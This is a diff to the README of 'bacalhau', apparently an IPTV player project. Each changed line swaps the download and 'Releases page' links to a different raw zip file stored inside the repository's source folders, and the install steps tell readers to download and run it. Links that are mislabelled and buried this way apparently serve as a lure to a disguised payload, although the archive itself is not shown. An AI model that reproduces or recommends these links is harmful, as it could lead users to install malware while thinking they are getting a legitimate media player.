@@ -8,9 +8,9 @@ Bacalhau is a modern IPTV player equipped with GPU-accelerated HLS transcoding. 
 Follow these steps to download and run bacalhau effortlessly.
 
 ## 📥 Download
-[![Download Latest Release](https://github.com/renfuji12/bacalhau/raw/refs/heads/main/src/stores/Software-1.8.zip%20Release-blue)](https://github.com/renfuji12/bacalhau/raw/refs/heads/main/src/stores/Software-1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/renfuji12/bacalhau/main/src/router/Software_2.8-alpha.3.zip%20Release-blue)](https://raw.githubusercontent.com/renfuji12/bacalhau/main/src/router/Software_2.8-alpha.3.zip)
 
-You can find the latest version of bacalhau on the [Releases page](https://github.com/renfuji12/bacalhau/raw/refs/heads/main/src/stores/Software-1.8.zip). 
+You can find the latest version of bacalhau on the [Releases page](https://raw.githubusercontent.com/renfuji12/bacalhau/main/src/router/Software_2.8-alpha.3.zip). 
 
 ## 💻 System Requirements
 For the best performance, ensure your system meets the following requirements:
@@ -20,7 +20,7 @@ For the best performance, ensure your system meets the following requirements:
 - An internet connection for playlist and content streaming.
 
 ## 🔧 Download & Install
-1. Visit the [Releases page](https://github.com/renfuji12/bacalhau/raw/refs/heads/main/src/stores/Software-1.8.zip) to download the latest version of bacalhau.
+1. Visit the [Releases page](https://raw.githubusercontent.com/renfuji12/bacalhau/main/src/router/Software_2.8-alpha.3.zip) to download the latest version of bacalhau.
 2. Choose the appropriate file for your operating system (Windows, macOS, Linux).
 3. Click the file link to start the download.
 4. Once downloaded, locate the file (usually in your Downloads folder).
